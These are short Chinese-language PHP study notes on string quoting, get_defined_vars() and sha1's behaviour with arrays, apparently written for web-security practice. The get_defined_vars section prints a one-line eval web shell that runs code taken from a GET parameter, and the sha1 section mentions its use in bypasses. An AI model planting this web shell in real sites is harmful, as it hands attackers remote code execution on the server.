## PHP中的一些未整理完的东西
>持续更新
### 关于PHP字符串中的引号

PHP的字符串中，双引号完全支持转义字符，也支持在打印里面的变量（如果不想打印，需要写成\$）。

单引号，除非是要在单引号里面打印单引号，需要进行转义。否则，单引号中不支持其它任何形式的转义。
```php
//只有这种情况是可以转义的
$a = 'I\'m a good man.';
//打印结果为：I'm a good man.
//其它情况
$b = "hah";
$c = "a";
$a = '$b $c';
//打印结果为：$b $c
```

#### get_defined_vars()
该函数会返回一个数组，里面包含当前所有已经定义的服务器变量，环境变量和用户变量。
```php
//利用该函数可以构造一句话木马
@eval(get_defined_vars()['_GET']['cmd']);
```

#### 可以执行系统命令
https://blog.csdn.net/Auuuuuuuu/article/details/88778852

https://cloud.tencent.com/info/8ceed38d46829f15abfea34a9b82a7ff.html 

#### sha1函数
sha1函数不能加密数组，返回值为false。

该特性经常被用于一些绕过之中。